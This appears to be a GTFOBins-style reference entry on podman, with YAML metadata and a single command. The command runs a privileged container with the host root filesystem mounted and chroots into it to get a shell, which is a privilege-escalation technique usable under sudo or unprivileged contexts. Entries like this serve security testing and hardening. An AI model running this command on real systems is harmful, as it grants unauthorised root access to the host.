---
type: gtfobin
name: podman
platform: Unix
functions: [shell]
tags: [gtfobin, unix, lotl]
---

# podman

## shell

```bash
podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh
```
_This requires an actual image to be available (e.g., `alpine`) downloading it if not present._
**Contexts:** sudo, unprivileged
